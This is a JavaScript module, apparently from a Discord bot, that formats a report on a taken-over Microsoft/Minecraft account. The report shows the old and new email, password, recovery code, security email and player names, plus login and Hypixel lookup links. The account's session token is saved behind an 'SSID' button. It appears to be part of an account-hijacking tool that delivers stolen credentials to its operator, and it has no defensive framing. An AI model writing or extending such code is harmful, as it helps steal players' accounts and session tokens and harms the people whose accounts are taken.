const { EmbedBuilder } = require("@discordjs/builders")
const { ActionRowBuilder, ButtonBuilder, ButtonStyle } = require("discord.js")
const { footer } = require("../../config.json")
const { queryParams } = require("../../db/db")
const generate = require("./generate")
module.exports = async (acc) => {
    let msg = {
    }
    let i = generate(32)
    let db = await queryParams(`INSERT INTO actions(id,action) VALUES(?,?)`, [i, `ssid|${acc.ssid}`])
    let embed = new EmbedBuilder().
        setColor(0x237feb).
        setFields(
            [
                {
                    name: "Previous",
                    value: "```" + acc.oldEmail + "```",
                    inline: true
                },
                {
                    name: "New",
                    value: "```" + acc.email + "```",
                    inline: true
                },
                {
                    name: "password",
                    value: "```" + acc.password + "```",
                    inline: false
                },
                {
                    name: "Recovery Code",
                    value: "```" + acc.recoveryCode + "```",
                    inline: false
                },
                {
                    name: "Security Email",
                    value: "```" + acc.secEmail + "```",
                    inline: false
                },
                {
                    name: "Old Name",
                    value: "```" + acc.oldName + "```",
                    inline: true
                },
                {
                    name: "New Name",
                    value: "```" + acc.newName + "```",
                    inline: true
                }
            ]).
        setTitle(`Account | ${acc.oldName}`).
        setDescription(`[login](https://login.live.com/login.srf?username=${acc.email.replaceAll(" ", "")}) | [Plancke](https://plancke.io/hypixel/player/stats/${acc.oldName.replaceAll(" ", "")}) | [SkyCrypt](https://sky.shiiyu.moe/stats/${acc.oldName.replaceAll(" ", "")}) | [Is Online?](https://hypixel.paniek.de/player/${acc.oldName.replaceAll(" ", "")}/status)`).
        setTimestamp(Date.now()).
        setFooter(footer).
        setThumbnail(`https://mineskin.eu/helm/${acc.oldName.replaceAll(" ", "")}`)
    msg.embeds = [embed]
    msg.components = [new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId("action|" + i).setLabel("SSID").setStyle(ButtonStyle.Primary))]
    return msg

}